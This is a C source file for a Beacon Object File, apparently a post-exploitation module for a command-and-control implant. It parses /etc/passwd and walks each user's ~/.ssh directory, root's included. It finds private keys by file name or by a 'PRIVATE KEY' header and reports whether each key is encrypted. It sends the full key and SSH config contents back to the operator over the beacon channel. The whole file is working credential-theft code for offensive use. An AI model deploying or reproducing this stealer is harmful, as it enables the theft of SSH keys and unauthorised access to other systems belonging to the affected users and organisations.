/// ssh_keys.c — Scan all users for SSH private keys, configs, known_hosts
/// gcc -c -o ssh_keys.o ssh_keys.c -include bof_api.h -Os -fPIC
#include "bof_api.h"

struct linux_dirent64 {
    unsigned long long d_ino; long long d_off;
    unsigned short d_reclen; unsigned char d_type; char d_name[];
};
#define DT_REG 8

static void hdr(const char *s) { BeaconPrintf(CALLBACK_OUTPUT, "\n\xe2\x94\x8c\xe2\x94\x80 %s\n", s); }
static void sub(const char *s) { BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x9c\xe2\x94\x80 %s\n", s); }
static void fin(const char *s) { BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x94\xe2\x94\x80 %s\n\n", s); }
static void ln(const char *s)  { BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x82  %s\n", s); }
static int g_keys = 0;

static void scan_ssh(const char *home, const char *user) {
    char sp[512]; AxSnprintf(sp, sizeof(sp), "%s/.ssh", home);
    int fd = AxOpenDir(sp); if (fd < 0) return;
    int printed_user = 0;
    char db[4096];
    while (1) {
        int nr = AxReadDir(fd, db, sizeof(db)); if (nr<=0) break;
        int p = 0;
        while (p < nr) {
            struct linux_dirent64 *e = (struct linux_dirent64*)(db+p);
            char *n = e->d_name;
            if (n[0]=='.'&&(n[1]=='\0'||(n[1]=='.'&&n[2]=='\0'))) { p+=e->d_reclen; continue; }

            char fp[768]; AxSnprintf(fp, sizeof(fp), "%s/%s", sp, n);
            int is_key = (AxStrcmp(n,"id_rsa")==0||AxStrcmp(n,"id_ed25519")==0||
                          AxStrcmp(n,"id_ecdsa")==0||AxStrcmp(n,"id_dsa")==0);
            if (!is_key && e->d_type == DT_REG) {
                char hd[48]; int hfd = AxOpenFile(fp,0,0);
                if (hfd >= 0) { int r=AxReadFile(hfd,hd,47); AxCloseFile(hfd);
                    if(r>20){hd[r]='\0'; if(AxStrstr(hd,"PRIVATE KEY"))is_key=1;} }
            }
            if (is_key) {
                if (!printed_user) {
                    char b[128]; AxSnprintf(b, sizeof(b), "%s (%s/.ssh/)", user, home);
                    sub(b); printed_user = 1;
                }
                char *kd = (char*)0; int kl = AxReadFileToBuffer(fp, &kd, 65536);
                if (kl > 0 && kd) {
                    int enc = (AxStrstr(kd, "ENCRYPTED") != (char*)0);
                    char b[128]; AxSnprintf(b, sizeof(b), "[%s] %s (%d bytes)",
                                            enc ? "ENCRYPTED" : "PLAINTEXT", n, kl);
                    ln(b);
                    BeaconOutput(CALLBACK_OUTPUT, kd, kl);
                    if (kd[kl-1] != '\n') BeaconOutput(CALLBACK_OUTPUT, "\n", 1);
                    g_keys++; AxFree(kd);
                }
            } else if (AxStrcmp(n,"authorized_keys")==0) {
                if (!printed_user) {
                    char b[128]; AxSnprintf(b, sizeof(b), "%s (%s/.ssh/)", user, home);
                    sub(b); printed_user = 1;
                }
                long fs=0; AxFileStat(fp,(unsigned int*)0,&fs,(unsigned int*)0,(unsigned int*)0);
                char b[80]; AxSnprintf(b, sizeof(b), "authorized_keys (%ld bytes)", fs); ln(b);
            } else if (AxStrcmp(n,"config")==0) {
                if (!printed_user) {
                    char b[128]; AxSnprintf(b, sizeof(b), "%s (%s/.ssh/)", user, home);
                    sub(b); printed_user = 1;
                }
                char *cd = (char*)0; int cl = AxReadFileToBuffer(fp, &cd, 65536);
                if (cl > 0 && cd) {
                    char b[64]; AxSnprintf(b, sizeof(b), "config (%d bytes)", cl); ln(b);
                    BeaconOutput(CALLBACK_OUTPUT, cd, cl);
                    if(cd[cl-1]!='\n') BeaconOutput(CALLBACK_OUTPUT,"\n",1);
                    AxFree(cd);
                }
            }
            p += e->d_reclen;
        }
    }
    AxCloseFile(fd);
}

void go(char *args, int args_len) {
    hdr("SSH Key Scanner");
    g_keys = 0;
    char *pw=(char*)0; int pl=AxReadFileToBuffer("/etc/passwd",&pw,524288);
    if (pl<=0||!pw) { BeaconPrintf(CALLBACK_ERROR,"[!] Cannot read /etc/passwd\n"); return; }
    int users = 0;
    char *line = pw;
    while (line < pw+pl) {
        char *eol = line; while(eol<pw+pl&&*eol!='\n')eol++;
        int f=0; char *un=line; int unl=0; char *hd=(char*)0; int hdl=0;
        char *sh=(char*)0; int shl=0; char *fs=line;
        for(char *p=line;p<=eol;p++){
            if(p==eol||*p==':'){
                if(f==0){un=fs;unl=(int)(p-fs);}
                else if(f==5){hd=fs;hdl=(int)(p-fs);}
                else if(f==6){sh=fs;shl=(int)(p-fs);}
                f++;fs=p+1;
            }
        }
        int skip=0;
        if(sh&&shl>0){
            if((shl>=7&&AxStrncmp(sh+shl-7,"nologin",7)==0)||(shl>=5&&AxStrncmp(sh+shl-5,"false",5)==0))skip=1;
        }
        if(unl==4&&AxStrncmp(un,"root",4)==0)skip=0;
        if(!skip&&hd&&hdl>0&&hdl<256){
            char hb[512],ub[256];
            AxMemcpy(hb,hd,hdl);hb[hdl]='\0';
            if(unl>255)unl=255;AxMemcpy(ub,un,unl);ub[unl]='\0';
            scan_ssh(hb,ub); users++;
        }
        line=eol+1;
    }
    AxFree(pw);
    char s[64]; AxSnprintf(s, sizeof(s), "%d users scanned, %d keys found", users, g_keys);
    fin(s);
}
